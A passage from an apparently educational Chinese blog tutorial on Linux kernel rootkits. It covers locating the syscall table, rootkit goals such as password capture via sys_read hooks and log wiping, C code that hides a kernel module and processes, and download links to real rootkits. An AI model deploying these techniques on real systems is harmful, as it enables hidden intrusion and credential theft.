(indirect call) */</span></span><br><span class="line">        readkmem (sc_asm,sys_call_off,CALLOFF);</span><br><span class="line">        p = (char*)memmem (sc_asm,CALLOFF,<span class="string">"\xff\x14\x85"</span>,<span class="number">3</span>);</span><br><span class="line">        sct = *(unsigned*)(p+<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span> (p) &#123;</span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">"sys_call_table at 0x%x, call dispatch at 0x%x\n"</span>,</span><br><span class="line">                        sct, p);</span><br><span class="line">        &#125;</span><br><span class="line">        close(kmem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>获取syscall table后，可以将整个syscall table替换为rootkit的syscall table， 也是前文提到的Suckit 的攻击方式。</p>
+<h3 id="0x5-Rootkit-Objectives"><a href="#0x5-Rootkit-Objectives" class="headerlink" title="0x5: Rootkit Objectives"></a>0x5: Rootkit Objectives</h3><p>1.隐藏文件</p>
+<p>通过strace ls可以发现ls命令其实是通过sys_getdents64获得文件目录的，因此可以通过修改sys_getdents64系统调用或者更底层的readdir实现隐藏文件及目录 </p>
+<p>2.隐藏进程</p>
+<p>隐藏进程的方法和隐藏文件类似，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果，即hook sys_getdents64和readdir等。   </p>
+<p>3.隐藏连接</p>
+<p>netstat命令是通过读取/proc文件系统下的net/tcp和net/udp文件获得当前连接信息，因此可以通过hook sys_read调用实现隐藏连接，也可以修改tcp4_seq_show和udp4_seq_show等函数实现。   </p>
+<p>4.隐藏模块</p>
+<p>lsmod命令主要是通过sys_query_module系统调用获得模块信息，可以通过hook sys_query_module系统调用隐藏模块，也可以通过将模块从内核模块链表中摘除从而达到隐藏效果  </p>
+<p>5.嗅探工具</p>
+<pre><code>1) 嗅探工具可以通过libpcap库直接访问链路层，截获数据包
+
+2) 也可以通过linux的netfilter框架在IP层的hook点上截获数据包
+</code></pre><p>嗅探器要获得网络上的其他数据包需要将网卡设置为混杂模式，这是通过ioctl系统调用的SIOCSIFFLAGS命令实现的，查看网卡的当前模式是通过SIOCGIFFLAGS命令，因此可以通过hook sys_ioctl隐藏网卡的混杂模式  </p>
+<p>6.密码记录</p>
+<p>密码记录可以通过hook sys_read系统调用实现，比如通过判断当前运行的进程名或者当前终端是否关闭回显，可以获取用户的输入密码。hook sys_read还可以实现login后门等其它功能  </p>
+<p>7.日志擦除</p>
+<p>传统的unix日志主要在</p>
+<pre><code>1) /var/log/messages
+
+2) /var/log/lastlog
+
+3) /var/run/utmp
+
+4) /var
+
+5) /log/wtmp下
+</code></pre><p>可以通过编写相应的工具对日志文件进行修改，还可以将HISTFILE等环境变设为/dev/null隐藏用户的一些操作信息</p>
+<p>8.内核后门</p>
+<pre><code>1) 本地的提权后门
+
+本地的提权可以通过对内核模块发送定制命令实现
+
+2) 网络的监听后门
+
+网络内核后门可以在IP层对进入主机的数据包进行监听，发现匹配的指定数据包后立刻启动回连进程
+</code></pre><h3 id="0x6-Example-Module-Hiding"><a href="#0x6-Example-Module-Hiding" class="headerlink" title="0x6: Example-Module Hiding"></a>0x6: Example-Module Hiding</h3><p>在linux中，编写的内核模块通过insmod（实际上是执行了init_module系统调用）命令插入到内核中，模块便与一个struct module 结构体相关联，并成为内核的一部分。所有的内核模块都被维护在一个全局链表中，链表头是个全局变量struct module *modules. 任何一个新创建的模块，都会被加入到这个链表的头部，通过modules-&gt;next引用。要枚举module的方法有许多种， a）.VFS方法: cat /proc/module: 直接读取/proc/module下的项; b). ring3方法: lsmod: 本质还是在读取/proc/module，做了一个代码封装，提供给用户一个良好的接口和界面; c). LKM方法: 直接通过kernel module枚举struct module-&gt;list; d). LKM方法: 直接通过kernel module枚举struct module-&gt;mkobj-&gt;kobj-&gt;entry; e).lKM方法: 直接通过kernel module枚举module-&gt;mkobj-&gt;kobj-&gt;kset.</p>
+<p>下面介绍采用断链法技术进行内核模块隐藏的代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line">MODULE HELPERS</span><br><span class="line">使用"断链法"技术进行内核模块的隐藏</span><br><span class="line">原理:</span><br><span class="line">1. linux将所有的内核模块都在内核中用循环双链表串联起来了</span><br><span class="line">2. 通过找到这些链表，并使用linux提供的链表操作宏将指定的"元素(对应内核模块)"从链表中断开</span><br><span class="line">3. 我们再通过lsmod、或者直接读取内核模块链表的时候自然无法枚举到被我们隐藏的模块了，达到隐藏模块的目的</span><br><span class="line">关于内核模块链表的相关知识请参阅</span><br><span class="line">http://www.cnblogs.com/LittleHann/p/3865490.html</span><br><span class="line">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">module_hide</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (module_hidden) </span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">    从struct module结构体可以看出，在内核态，我们如果要枚举当前模块列表，可以使用list、kobj这两个成员域进行枚举</span><br><span class="line">    自然在断链隐藏的时候也需要对这两个成员进行操作</span><br><span class="line">    */</span></span><br><span class="line">    module_previous = THIS_MODULE-&gt;<span class="built_in">list</span>.prev;</span><br><span class="line">    list_del(&amp;THIS_MODULE-&gt;<span class="built_in">list</span>);</span><br><span class="line">    </span><br><span class="line">    module_kobj_previous = THIS_MODULE-&gt;mkobj.kobj.entry.prev;</span><br><span class="line">    kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);</span><br><span class="line">    </span><br><span class="line">    list_del(&amp;THIS_MODULE-&gt;mkobj.kobj.entry);</span><br><span class="line">    module_hidden = !module_hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有关LKM模块隐藏还可参考： <a href="http://www.freebuf.com/articles/system/54263.html" target="_blank" rel="external">Linux Rootkit系列一：LKM的基础编写及隐藏</a></p>
+<h3 id="0x7-Example-Process-Hiding"><a href="#0x7-Example-Process-Hiding" class="headerlink" title="0x7: Example-Process Hiding"></a>0x7: Example-Process Hiding</h3><p>上文提到，ps命令是通过读取/proc文件系统下的进程目录获得进程信息的，只要能够隐藏/proc文件系统下的进程目录就可以达到隐藏进程的效果。<br>以下是基于/proc目录读取函数劫持的进程隐藏代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">proc_readdir_new</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="keyword">void</span> *dirent, filldir_t filldir)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    proc_filldir_orig = filldir;</span><br><span class="line">    return proc_readdir_orig(filp, dirent, proc_filldir_new);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//CALLBACK SECTION</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">proc_filldir_new</span><span class="params">(<span class="keyword">void</span> *buf, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> namelen, loff_t offset, u64 ino, <span class="keyword">unsigned</span> d_type)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; current_pid; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span><br><span class="line">        当检测到指定的需要隐藏的进程时，直接returned返回，即直接跳过这个进程的枚举</span><br><span class="line">        */</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, pids_to_hide[i])) </span><br><span class="line">        &#123;</span><br><span class="line">            return <span class="number">0</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">"rtkit"</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        return <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x8-Rootkit-Sample"><a href="#0x8-Rootkit-Sample" class="headerlink" title="0x8: Rootkit Sample"></a>0x8: Rootkit Sample</h3><p>1). adore-ng(lkm)。adore-ng不修改系统调用层的内容，而是通过修改VFS（Virtual Filesystem Switch)层的具体处理函数，如替换VFS层的 file_ops等函数，来实现信息隐藏目的。原理细节可参考：<a href="http://www.cnblogs.com/LittleHann/p/3879961.html#commentform" target="_blank" rel="external">adore-ng learning</a>. 下载： <a href="https://packetstormsecurity.com/files/32843/adore-ng-0.41.tgz.html" target="_blank" rel="external">adore-ng 0.41</a>, <a href="https://github.com/chonghw/adore-ng" target="_blank" rel="external">adore-ng github for linux 2.6 and 3.x</a></p>
+<p>2). knark(Hooking system call). 行为：隐藏或显示文件或目录； 隐藏TCP或UDP连接；程序执行重定向；非授权地用户权限增加(“rootme”)； 改变一个运行进程的UID/GID的工具；非授权地、特权程序远程执行守护进程(后门端口)；Kill –31: 隐藏运行的进程；调用表修改: rootkit通过修改导出的系统调用表，对与攻击行为相关的系统调用进行替换，隐藏攻击者的行踪。 原理细节可参考： <a href="http://www.cnblogs.com/LittleHann/p/3879961.html#commentform" target="_blank" rel="external">kark learning</a> .下载：<a href="https://packetstormsecurity.com/files/24853/knark-2.4.3.tgz.html" target="_blank" rel="external">knark download</a></p>
+<p>3).suckit(DKOM). 行为：采用动态隐藏的方式来隐藏指定的内容，包括文件、进程、以及网络连接。suckit不同于其它基于lkm的hooking rootkit，没有修改系统调用表的内容，而是首先拷贝了系统调用表，然后将拷贝的系统调用表按照攻击者的意图进行修改执行攻击者改写的系统调用响应函数,然后将system_call（INT 80服务程序)从旧的系统调用表上移开，指向新的系统调用表. 有关suckit原理详细介绍，可参考: <a href="http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf" target="_blank" rel="external">suckit learning</a>。  下载：<a href="https://packetstormsecurity.com/files/40690/suckit2priv.tar.gz.html" target="_blank" rel="external">suckit download</a></p>
+<p>其它rootkit samples还包括：<a href="https://github.com/David-Reguera-Garcia-Dreg/enyelkm" target="_blank" rel="external">enyelkm</a>,<a href="http://www.cnblogs.com/LittleHann/p/3879961.html#commentform" target="_blank" rel="external">wnps</a>, <a href="https://github.com/cloudsec/brootkit" target="_blank" rel="external">brootkit</a>,(其中brootkit详细介绍可参考<a href="http://www.cnblogs.com/LittleHann/p/4321826.html" target="_blank" rel="external">brookit analysis</a>),  <a href="https://packetstormsecurity.com/files/128945/Xingyiquan-Linux-2.6.x-3.x-Rootkit.html" target="_blank" rel="external">xingyiquan</a>,<a href="https://packetstormsecurity.com/files/24482/Synapsys-lkm.tar.gz.html" target="_blank" rel="external">synapsys</a>, <a href="http://average-coder.blogspot.com/2011/12/linux-rootkit.html" target="_blank" rel="external">Average coder analysis</a>, <a href="https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit" target="_blank" rel="external">Average coder download</a></p>
+<h3 id="0x9-Rootkit-Resources"><a href="#0x9-Rootkit-Resources" class="headerlink" title="0x9: Rootkit Resources"></a>0x9: Rootkit Resources</h3><p>列出一些rootkit学习相关资源，也是本文参考的主要来源，详见References。 rootkit出于本身恶意的原因，sample并不是那么好找，本文列出一些用于Research目的的malware站点，以便大家参考。</p>
+<blockquote>
+<p>>&gt;Malware Research Source</p>
+<p> <a href="http://contagiodump.blogspot.com/" target="_blank" rel="external">http://contagiodump.blogspot.com/</a></p>
+<p><a href="http://zeltser.com/combating-malicious-software/malware-sample-sources.html" target="_blank" rel="external">http://zeltser.com/combating-malicious-software/malware-sample-sources.html</a></p>
+<p><a href="https://forums.malwarebytes.org/" target="_blank" rel="external">https://forums.malwarebytes.org/</a></p>
+<p><a href="http://www.offensivecomputing.net/" target="_blank" rel="external">http://www.offensivecomputing.net/</a></p>
+<p><a href="https://cve.mitre.org/compatible/requirements.html" target="_blank" rel="external">https://cve.mitre.org/compatible/requirements.html</a></p>
+<p><a href="https://packetstormsecurity.com" target="_blank" rel="external">https://packetstormsecurity.com</a></p>
+<p> <a href="https://github.com" target="_blank" rel="external">https://github.com</a></p>
+</blockquote>
+<hr>
+<h3 id="0xA-Acknowledgement"><a href="#0xA-Acknowledgement" class="headerlink" title="0xA: Acknowledgement"></a>0xA: Acknowledgement</h3><p>本文有部分知识来源于 Phd shiqing以及新浪微博用户@Littlehann 两位大神的指点。</p>
+<p>本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)</p>
+<p>转载本文请注明出处:<a href="http://www.chongh.wiki/blog/2016/03/07/rootkit-tutorial/" target="_blank" rel="external">http://www.chongh.wiki/blog/2016/03/07/rootkit-tutorial/</a></p>
+<p>作者[新浪微博：<a href="http://weibo.com/diting0x/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo" target="_blank" rel="external">@diting0x</a>]</p>
+<hr>
+<h3 id="0xB-References"><a href="#0xB-References" class="headerlink" title="0xB: References"></a>0xB: References</h3><blockquote>
+<p><a href="http://www.ists.dartmouth.edu/library/409.pdf" target="_blank" rel="external">Detecting kernel rootkits</a></p>
+<p><a href="https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/chiang/chiang_html/" target="_blank" rel="external">A Case Study of the Rustock Rootkit and Spam Bot</a></p>
+<p><a href="http://blog.invisiblethings.org/papers/2006/rutkowska_malware_taxonomy.pdf" target="_blank" rel="external">Introducing Stealth Malware Taxonomy</a></p>
+<p><a href="http://www.cs.rutgers.edu/~iftode/SystemicThreats07.pdf" target="_blank" rel="external">Kernel rootkit classification</a></p>
+<p><a href="http://www.cnblogs.com/LittleHann/p/3870974.html" target="_blank" rel="external">Linux Rootkit Learning</a></p>
+<p><a href="http://www.cnblogs.com/LittleHann/p/3910696.html" target="_blank" rel="external">Rootkit Hacking Technology &amp;&amp; Defence Strategy Research</a></p>
+<p><a href="http://www.phrack.org/archives/issues/58/6.txt" target="_blank" rel="external">Advances in Kernel Hacking</a></p>
+<p><a href="http://althing.cs.dartmouth.edu/local/vsc07.html" target="_blank" rel="external">Runtime kernel kmem patching</a></p>
+<p><a href="https://www.blackhat.com/presentations/bh-europe-09/Lineberry/BlackHat-Europe-2009-Lineberry-code-injection-via-dev-mem.pdf" target="_blank" rel="external">Malicious Code Injection via /dev/mem</a></p>
+<p><a href="http://turbochaos.blogspot.hk/2013/10/writing-linux-rootkits-301_31.html" target="_blank" rel="external">Modern Linux Rootkits 301 - Bypassing modules_disabled security</a></p>
+<p><a href="http://www.phrack.org/archives/issues/59/4.txt" target="_blank" rel="external">Handling Interrupt Descriptor Table for fun and profit:</a></p>
+<p><a href="http://www.phrack.org/archives/issues/61/7.txt" target="_blank" rel="external">Hijacking Linux Page Fault Handler: Exception Table</a></p>
+<p><a href="http://www.phrack.org/archives/issues/61/14.txt" target="_blank" rel="external">Kernel Rootkit Experiences</a></p>
+<p><a href="http://www.phrack.org/archives/issues/65/8.txt" target="_blank" rel="external">Mistifying the debugger</a></p>
+<p><a href="https://www.thc.org/papers/LKM_HACKING.html" target="_blank" rel="external">Complete Linux Loadable Kernel Modules</a></p>
+<p><a href="http://www.phrack.org/archives/issues/52/18.txt" target="_blank" rel="external">Weakening the Linux Kernel</a></p>
+<p><a href="http://www.freebuf.com/articles/system/54263.html" target="_blank" rel="external">Linux Rootkit系列一：LKM的基础编写及隐藏</a></p>
+<p><a href="http://ab-rtfm.blogspot.com/2007/07/explorations-with-adore-ng.html" target="_blank" rel="external">Explorations with adore-ng</a></p>
+<p><a href="http://www.cnblogs.com/LittleHann/p/3879961.html#commentform" target="_blank" rel="external">Linux Rootkit Sample &amp;&amp; Rootkit Defenser Analysis</a></p>
+<p><a href="http://www.hacker.com.cn/uploadfile/2013/0416/20130416020443596.pdf" target="_blank" rel="external">Suckit技术原理</a></p>
+<p> <a href="http://labs.lastline.com/high-resolution-dynamic-analysis-of-windows-kernel-rootkits" target="_blank" rel="external">High-Resolution Dynamic Analysis of Windows Kernel Rootkits</a></p>
+<p><a href="http://labs.lastline.com/dissecting-turla-rootkit-malware-using-dynamic-analysis" target="_blank" rel="external">Dissecting Turla Rootkit Malware Using Dynamic Analysis</a></p>
+<p><a href="https://securityintelligence.com/detecting-and-analyzing-kernel-based-malware/" target="_blank" rel="external">Detecting and Analyzing Kernel-Based Malware</a></p>
+<p><a href="http://phrack.org/issues/58/7.html" target="_blank" rel="external">suckit: Linux on-the-fly kernel patching without LKM</a></p>
+<p><a href="http://la-samhna.de/library/rootkits/basics.html" target="_blank" rel="external">Linux Kernel Rootkits</a></p>
+<p><a href="http://www.symantec.com/avcenter/reference/when.malware.meets.rootkits.pdf" target="_blank" rel="external">When Malware Meets Rootkits</a></p>
+<p><a href="http://www.cnblogs.com/LittleHann/p/3854977.html" target="_blank" rel="external">Linux System Calls Hooking Method Summary</a></p>
+<p><a href="http://opensecuritytraining.info/Rootkits.html" target="_blank" rel="external">http://opensecuritytraining.info/Rootkits.html</a></p>
+<p><a href="http://www.linux-magazine.com/Online/Features/Kernel-Rootkit-Tricks" target="_blank" rel="external">Kernel Rootkit Tricks</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+<div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center">
+  <div>攒点碎银娶媳妇</div>
+  <button id="rewardButton", disable="enable", onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}", style="cursor: pointer; border: 0; outline: 0; border-radius: 100%; padding: 0; margin: 0; letter-spacing: normal; text-transform: none; text-indent: 0px; text-shadow: none">
+    <span onmouseover="this.style.color='rgb(236,96,0)';this.style.background='rgb(204,204,204)'" onMouseOut="this.style.color='#fff';this.style.background='rgb(236,96,0)'" style="display: inline-block; width: 70px; height: 70px; border-radius: 100%; line-height: 81px; color: #fff; font: 400 35px/75px 'microsofty'; background: rgb(236,96,0)">赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatnone.png" alt="Diting0x WeChat Pay" style="width: 200px; max-width: 100%; display: inline-block"/>
+        <p>微信打赏</p>
+      </div>
+    
+    
+  </div>
+</div>
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Security/" rel="tag">#Security</a>
+          
+            <a href="/tags/Attack/" rel="tag">#Attack</a>
+          
+            <a href="/tags/Rootkit/" rel="tag">#Rootkit</a>
+          
+            <a href="/tags/Malware/" rel="tag">#Malware</a>
+          
+            <a href="/tags/Kernel/" rel="tag">#Kernel</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/2016/02/24/memorywar-defense/" rel="next" title="内存持久战-防御机制">
+                <i class="fa fa-chevron-left"></i> 内存持久战-防御机制
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/2016/03/31/virt-setup-analysis/" rel="prev" title="A Comprehensive Virtualized Enviroment Setup and Analysis">
+                A Comprehensive Virtualized Enviroment Setup and Analysis <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="blog/2016/03/08/rootkit-tutorial/"
+           data-title="A Comprehensive Tutorial of Rootkit" data-url="http://yoursite.com/blog/2016/03/08/rootkit-tutorial/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Diting0x" />
+          <p class="site-author-name" itemprop="name">Diting0x</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/">
+              <span class="site-state-item-count">35</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">13</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/diting0x" target="_blank" title="微博">
+                  
+                  微博
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element">
+            <div class="links-of-blogroll-title">
+              <i class="fa fa-globe fa-fw"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yebangyu.org/" title="yebangyu" target="_blank">yebangyu</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://xiaolili.net/" title="wangli" target="_blank">wangli</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://skykewei.top/" title="dukewei" target="_blank">dukewei</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://armsword.com/" title="armsword" target="_blank">armsword</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-Definition-of-rootkit"><span class="nav-number">1.</span> <span class="nav-text">0x1: Definition of rootkit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-Classification-of-Rootkit"><span class="nav-number">2.</span> <span class="nav-text">0x2: Classification of Rootkit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-Hooking-Kernel-Object-Hooking-Rootkit"><span class="nav-number">3.</span> <span class="nav-text">0x3: Hooking(Kernel Object Hooking) Rootkit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X4-DKOM-Rootkit"><span class="nav-number">4.</span> <span class="nav-text">0X4: DKOM Rootkit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x5-Rootkit-Objectives"><span class="nav-number">5.</span> <span class="nav-text">0x5: Rootkit Objectives</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x6-Example-Module-Hiding"><span class="nav-number">6.</span> <span class="nav-text">0x6: Example-Module Hiding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x7-Example-Process-Hiding"><span class="nav-number">7.</span> <span class="nav-text">0x7: Example-Process Hiding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x8-Rootkit-Sample"><span class="nav-number">8.</span> <span class="nav-text">0x8: Rootkit Sample</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x9-Rootkit-Resources"><span class="nav-number">9.</span> <span class="nav-text">0x9: Rootkit Resources</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0xA-Acknowledgement"><span class="nav-number">10.</span> <span class="nav-text">0xA: Acknowledgement</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0xB-References"><span class="nav-number">11.</span> <span class="nav-text">0xB: References</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <!--chonghua 注释--> 
+ <!--span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span-->
+  <span class="author" itemprop="copyrightHolder">Diting0x</span>
+</div>
+
+
+<!--chonghua注释掉了-->
+
+<!--div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div-->
+
+<!--div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div-->
+
+        
+
+        
+      </div>
+    </footer>
+
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"chongh"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
